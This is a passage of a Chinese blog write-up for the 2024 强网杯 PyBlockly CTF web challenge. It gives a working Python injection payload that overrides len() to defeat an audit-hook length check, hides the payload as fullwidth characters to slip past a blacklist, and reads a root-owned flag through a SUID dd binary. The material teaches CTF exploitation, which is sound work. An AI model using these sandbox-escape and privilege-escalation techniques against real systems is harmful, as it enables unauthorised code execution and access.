+</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;sys&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">my_audit_hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">xxx</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>解题思路，写入 <code>__import__(os).system(whoami)</code> ，命令注入，但会被 <code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code>  拦截</p>
+<p>绕过思路：</p>
+<p><code>locals()</code> 包含常见的函数，使用 <code>update()</code> 覆盖 <code>len()</code> 函数，当用 <code>len()</code> 函数时去执行匿名函数 <code>lambda x:4</code>，让其只返回 4</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">locals().update({&#34;len&#34;:lambda x:4});__import__(&#34;os&#34;).system(&#34;whoami&#34;)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>程序设置了黑名单，将 <code>$!</code> 等有特殊作用的字符全部过滤了，但是下面的代码存在编码转换绕过</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">code =  &#34;&#39;&#34; + unidecode.unidecode(block[&#39;fields&#39;][&#39;TEXT&#39;]) + &#34;&#39;&#34;
+</span></span><span class="line"><span class="cl"># 将字符进行unidecode解码(用于处理特殊字符，这里存在特殊字符全角转换绕过)并拼接给code</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>半角全角编码转换 py 脚本</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_fullwidth</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xFEE0</span><span class="p">)</span> <span class="k">if</span> <span class="s1">&#39;!&#39;</span> <span class="o">&lt;=</span> <span class="n">char</span> <span class="o">&lt;=</span> <span class="s1">&#39;~&#39;</span> <span class="k">else</span> <span class="n">char</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">text</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_halfwidth</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xFEE0</span><span class="p">)</span> <span class="k">if</span> <span class="s1">&#39;！&#39;</span> <span class="o">&lt;=</span> <span class="n">char</span> <span class="o">&lt;=</span> <span class="s1">&#39;～&#39;</span> <span class="k">else</span> <span class="n">char</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">text</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 示例用法</span>
+</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;!!!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;全角:&#34;</span><span class="p">,</span> <span class="n">to_fullwidth</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>  <span class="c1"># 转换为全角</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;半角:&#34;</span><span class="p">,</span> <span class="n">to_halfwidth</span><span class="p">(</span><span class="n">to_fullwidth</span><span class="p">(</span><span class="n">text</span><span class="p">)))</span>  <span class="c1"># 转换为半角</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>假如输入一个中文，会转为<figure>
+  <img src="image-20241107163216101.png" alt="image-20241107163216101" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241107170231102.png" alt="image-20241107170231102" loading="lazy"></figure>
+</p>
+<p>输入全角的 <code>!!!</code>，可以看到对方会解析成正常的 <code>!!!</code></p>
+<p><figure>
+  <img src="image-20241107170243066.png" alt="image-20241107170243066" loading="lazy"></figure>
+</p>
+<p>通过网站根目录 JS 服务发送的请求体中，是 <code>['blocks'][blocks]['type']=='print'</code> ，因此最终 code 代码会被 <code>f&quot;print({text})&quot;</code> 包裹</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">if block_type == &#39;print&#39;:
+</span></span><span class="line"><span class="cl">    text_block = block[&#39;inputs&#39;][&#39;TEXT&#39;][&#39;block&#39;]
+</span></span><span class="line"><span class="cl">    text = block_to_python(text_block)
+</span></span><span class="line"><span class="cl">    code = f&#34;print({text})&#34;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>最终命令注入时闭合： <code>');xxxx#</code></p>
+<p>最终 Payload</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&#39;);locals().update({&#34;len&#34;:lambda x:4});__import__(&#34;os&#34;).system(&#34;whoami&#34;)#</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>半角转全角</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">＇）；ｌｏｃａｌｓ（）．ｕｐｄａｔｅ（｛＂ｌｅｎ＂：ｌａｍｂｄａ ｘ：４｝）；＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｗｈｏａｍｉ＂）＃</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241107183154329.png" alt="image-20241107183154329" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241107183037523.png" alt="image-20241107183037523" loading="lazy"></figure>
+</p>
+<p>flag 文件权限级为 <code>root</code> ，当前权限为 <code>ctf</code></p>
+<p><figure>
+  <img src="image-20241107183713575.png" alt="image-20241107183713575" loading="lazy"></figure>
+</p>
+<p>dd 具有SUID位，有 <code>root</code> 权限，直接利用 <code>dd if=$FILES</code> 读取文件</p>
+<p><figure>
+  <img src="image-20241107184411083.png" alt="image-20241107184411083" loading="lazy"></figure>
+</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/block/" class="post-footer-tag-link" title="Tags - Block">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Block</span>
+          </a>
+        </li><li class="post-footer-tag-item">
+          <a href="/tags/string-buffer-overflow/" class="post-footer-tag-link" title="Tags - String Buffer Overflow">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>String Buffer Overflow</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" data-title="强网杯 2024 初赛 Web Challenge Walkthrough" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Block,String Buffer Overflow"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" data-hashtag="Block"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" data-title="强网杯 2024 初赛 Web Challenge Walkthrough"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94arl%E4%BC%98%E5%8C%96/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">资产侦察系统灯塔ARL优化</div>
+          </div>
+        </a><a href="/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">NCTF 2025 Web Writeup&amp;Challenge Walkthrough</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#2024-强网杯platform">[2024 强网杯]platform</a></li>
+        <li><a href="#2024-强网杯pyblockly">[2024 强网杯]PyBlockly</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/891293ef4fff03bb456216d35680cffa.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
